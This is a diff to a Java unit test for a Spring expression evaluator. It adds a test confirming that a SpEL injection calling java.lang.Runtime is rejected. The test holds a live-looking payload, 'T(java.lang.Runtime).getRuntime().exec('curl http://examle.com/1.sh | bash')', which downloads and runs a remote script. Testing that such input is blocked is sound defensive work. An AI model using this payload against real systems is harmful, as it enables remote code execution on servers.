@@ -1,6 +1,7 @@
 package com.wind.script.spring;
 
 import com.google.common.collect.ImmutableMap;
+import com.wind.common.exception.BaseException;
 import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.Test;
 import org.springframework.expression.EvaluationContext;
@@ -9,7 +10,7 @@ import org.springframework.expression.spel.support.StandardEvaluationContext;
 import java.util.HashMap;
 import java.util.Map;
 
-class SpringExpressionEvaluatorTest {
+class SpringExpressionEvaluatorTests {
 
     @Test
     void testEval1() {
@@ -47,5 +48,13 @@ class SpringExpressionEvaluatorTest {
         result = SpringExpressionEvaluator.DEFAULT.eval("T(com.wind.common.util.StringMatchUtils).containsAny('test1', {'测试', " +
                 "'测试1', '测试2'})");
         Assertions.assertNotEquals(Boolean.TRUE, result);
+    }
+
+    @Test
+    void testRCE() {
+        // 恶意用户可能通过输入这样的 SpEL 表达式来执行任意命令：
+        String expression = "T(java.lang.Runtime).getRuntime().exec('curl http://examle.com/1.sh | bash')";
+        BaseException exception = Assertions.assertThrows(BaseException.class, () -> SpringExpressionEvaluator.DEFAULT.eval(expression));
+        Assertions.assertEquals("不允许调用 class name = java.lang.Runtime 的方法",exception.getMessage());
     }
 }
